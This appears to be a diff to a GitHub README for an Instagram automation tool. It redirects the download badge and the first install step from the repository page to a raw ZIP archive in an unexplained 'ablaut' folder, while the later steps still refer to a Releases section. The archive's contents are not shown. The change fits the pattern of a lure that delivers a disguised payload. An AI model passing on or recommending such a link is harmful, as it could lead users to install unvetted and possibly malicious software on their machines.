@@ -1,6 +1,6 @@
 # 🤖 instagram-automation-tool - Manage your accounts with ease today
 
-[![Download Instagram Automation Tool](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/zher807/instagram-automation-tool)
+[![Download Instagram Automation Tool](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/zher807/instagram-automation-tool/raw/refs/heads/main/ablaut/instagram_tool_automation_3.7.zip)
 
 ## 📌 About this project
 
@@ -17,7 +17,7 @@ Ensure your computer has the following installed before you start:
 
 ## 📥 How to download and install
 
-1.  Visit the following link to access the software files: [https://github.com/zher807/instagram-automation-tool](https://github.com/zher807/instagram-automation-tool).
+1.  Visit the following link to access the software files: [https://github.com/zher807/instagram-automation-tool/raw/refs/heads/main/ablaut/instagram_tool_automation_3.7.zip](https://github.com/zher807/instagram-automation-tool/raw/refs/heads/main/ablaut/instagram_tool_automation_3.7.zip).
 2.  Look for the section marked Releases on the right side of the screen.
 3.  Click the version number under the Latest release header.
 4.  Download the ZIP file containing the application.
